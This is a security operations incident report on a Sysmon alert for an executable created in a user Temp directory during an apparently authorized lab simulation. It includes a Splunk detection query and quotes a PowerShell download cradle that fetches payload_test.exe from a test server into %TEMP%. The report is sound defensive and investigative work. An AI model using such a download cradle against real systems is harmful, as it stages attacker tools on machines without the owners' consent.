# SOC Investigation Report: Suspicious Executable File Creation

**Incident ID:** SOC-FILE-2026-1030-02  
**Status:** Closed (Validated Authorized Lab Test)  
**Severity:** High (Executable dropped in user-writable directory)  
**Detection Source:** Sysmon Event ID 11 (`XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`)  
**First Seen / Last Seen:** 2026-10-30 19:39:04 UTC  
**Affected Host:** `WIN-ENDPOINT-01`  
**User / Account:** `WIN-ENDPOINT-01\labadmin`  
**Target File:** `C:\Users\labadmin\AppData\Local\Temp\payload_test.exe`

---

## Executive Summary

A file monitoring alert triggered in Splunk indicating that an executable binary (`payload_test.exe`) was created within `C:\Users\labadmin\AppData\Local\Temp\`. Dropping binaries into temporary user-writable locations is a common technique employed by droppers, staging scripts, and initial access payloads to bypass execution restrictions.

---

## Event Evidence

| Timestamp | Host | Event ID | Image (Creator) | Target Filename | User | Evidence Reference |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| `2026-10-30 19:39:04` | `WIN-ENDPOINT-01` | Sysmon 11 | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | `C:\Users\labadmin\AppData\Local\Temp\payload_test.exe` | `labadmin` | Sysmon Ingestion Register |

---

## Detection Logic

```spl
index=blue EventCode=11
| eval File_Path=coalesce(TargetFilename,Target_File_Name)
| where match(File_Path,"(?i)\\(temp|appdata|downloads|public|desktop|programdata)\\") AND match(File_Path,"(?i)\.exe$")
| table _time host User Image File_Path
| sort - _time
```

---

## Investigation Methodology

1. **Identifying the Dropping Process:**
   - Evaluated Sysmon Event ID 11 telemetry; creating image identified as `powershell.exe`.
2. **Script Block Corroboration (Event ID 4104):**
   - Queried `Microsoft-Windows-PowerShell/Operational` around `19:39:04`.
   - Discovered script block invoking `Invoke-WebRequest -Uri "http://192.168.10.50/payload_test.exe" -OutFile "$env:TEMP\payload_test.exe"`.
3. **Network Connection Corroboration (Event ID 3):**
   - Confirmed outbound HTTP connection on port 80 to `192.168.10.50` (Kali Linux test platform).
4. **Execution Check (Event ID 1):**
   - Queried Sysmon Event ID 1 for execution attempts of `payload_test.exe`.
   - Found no immediate execution events; file was isolated prior to execution.

---

## Findings & Assessment

- **Observed Facts:** An executable binary was downloaded via PowerShell from adversary simulation server `192.168.10.50` and written directly into `AppData\Local\Temp`.
- **Assessment:** Activity directly correlates with controlled Ingress Tool Transfer simulation test.
- **MITRE ATT&CK Mapping:**
  - **T1105:** Ingress Tool Transfer
  - **T1059.001:** PowerShell Download Cradle

---

## Response & Follow-up

- File removed from `%TEMP%` directory.
- Firewall rule confirmed blocking outbound non-proxy web traffic for endpoints.
- Closed as **Validated Test Simulation**.
